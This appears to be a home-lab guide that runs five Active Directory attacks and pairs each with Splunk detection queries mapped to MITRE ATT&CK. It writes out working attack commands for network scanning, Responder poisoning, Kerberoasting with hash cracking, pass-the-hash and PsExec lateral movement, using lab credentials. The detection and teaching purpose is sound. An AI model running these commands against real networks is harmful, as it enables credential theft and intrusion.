# Phase 6 — Attack Simulation & Detection

## Overview
This guide documents attack scenarios executed against the lab environment and corresponding Splunk detections. Each attack is mapped to MITRE ATT&CK techniques.

> **Status**: In Progress — This document will be updated as attacks are performed and detections are built.

---

## Attack Scenarios

### Attack 1 — Network Reconnaissance (Nmap)
**MITRE**: T1046 - Network Service Discovery

#### Execution (Kali)
```bash
# Full network scan
sudo nmap -sV -sC -O 192.168.10.0/24

# Targeted DC scan
sudo nmap -sV -sC -p 53,88,135,139,389,445,636,3268,3269 192.168.10.10
```

#### Detection (Splunk)
```splunk
index=wineventlog EventCode=4625
| stats count by IpAddress
| where count > 10
| sort -count
```

**Key Indicators**:
- Multiple failed connection attempts from same IP
- Port scanning pattern in network logs
- Sysmon Event ID 3 (network connections) from unusual source

---

### Attack 2 — LLMNR/NBT-NS Poisoning (Responder)
**MITRE**: T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay

#### Execution (Kali)
```bash
sudo responder -I eth1 -dPv
```

#### What Happens
1. Kali listens for LLMNR/NBT-NS broadcast requests
2. A Windows machine attempts to resolve a hostname
3. Responder intercepts and responds, claiming to be the target
4. Windows sends NTLMv2 hash to Kali for authentication
5. Hash is captured for offline cracking

#### Detection (Splunk)
```splunk
# Look for NTLM authentication from unexpected source
index=wineventlog EventCode=4648
| table _time, Account_Name, TargetServerName, IpAddress

# Sysmon network connections to Kali IP
index=wineventlog source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
| search DestinationIp="192.168.10.50"
```

> Note: LLMNR and NBT-NS are disabled via GPO in this lab. This attack tests whether the GPO is effective and what logs are generated when the attack is attempted.

---

### Attack 3 — Kerberoasting (Impacket)
**MITRE**: T1558.003 - Kerberoasting

#### Execution (Kali)
```bash
# Request TGS tickets for all SPN accounts
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  corp.local/jsmith:Password123! \
  -dc-ip 192.168.10.10 \
  -request

# Crack the hash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### What Happens
1. Attacker authenticates as low-privilege user (jsmith)
2. Requests Kerberos service ticket for svc.sql (has registered SPN)
3. DC issues ticket encrypted with svc.sql's password hash
4. Attacker receives encrypted ticket
5. Hash is cracked offline — no lockout risk

#### Detection (Splunk)
```splunk
# RC4 encryption ticket requests (indicator of Kerberoasting)
index=wineventlog EventCode=4769 Ticket_Encryption_Type=0x17
| table _time, Account_Name, Service_Name, Client_Address

# Multiple TGS requests from same user
index=wineventlog EventCode=4769
| stats count by Account_Name, Client_Address
| where count > 3
```

**Key Indicators**:
- Event ID 4769 with Ticket_Encryption_Type=0x17 (RC4)
- Multiple service ticket requests from a standard user account
- Requests targeting service accounts with SPNs

---

### Attack 4 — Pass-the-Hash (CrackMapExec)
**MITRE**: T1550.002 - Pass the Hash

#### Execution (Kali)
```bash
# Authenticate using NTLM hash instead of password
crackmapexec smb 192.168.10.0/24 -u itadmin -H <NTLM_HASH>
```

#### Detection (Splunk)
```splunk
# Network logons (Type 3) without Kerberos
index=wineventlog EventCode=4624 Logon_Type=3
| search NOT Account_Name="*$"
| table _time, Account_Name, IpAddress, Logon_Type

# Failed PTH attempts
index=wineventlog EventCode=4625 Logon_Type=3
| stats count by Account_Name, IpAddress
```

---

### Attack 5 — Lateral Movement (PsExec)
**MITRE**: T1021.002 - SMB/Windows Admin Shares

#### Execution (Kali)
```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  corp.local/itadmin:Password123!@192.168.10.20
```

#### Detection (Splunk)
```splunk
# PsExec service installation
index=wineventlog EventCode=7045
| search Service_Name="PSEXESVC" OR Service_Name="*psexec*"
| table _time, host, Service_Name, Service_File_Name

# Remote command execution via Sysmon
index=wineventlog source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| search ParentImage="*services.exe*"
| table _time, host, Image, CommandLine, ParentImage
```

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tool Used | Phase |
|---|---|---|---|
| T1046 | Network Service Discovery | nmap | Reconnaissance |
| T1557.001 | LLMNR/NBT-NS Poisoning | Responder | Credential Access |
| T1558.003 | Kerberoasting | Impacket | Credential Access |
| T1550.002 | Pass the Hash | CrackMapExec | Lateral Movement |
| T1021.002 | SMB/Windows Admin Shares | PsExec | Lateral Movement |

---

## Detection Dashboard Queries

### SOC Overview Dashboard
```splunk
# Failed logins in last 24 hours
index=wineventlog EventCode=4625 earliest=-24h
| timechart count by Account_Name

# Top attacked accounts
index=wineventlog EventCode=4625 earliest=-24h
| stats count by Account_Name
| sort -count
| head 10

# Suspicious processes (Sysmon)
index=wineventlog source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 earliest=-1h
| table _time, host, Image, CommandLine, ParentImage
```
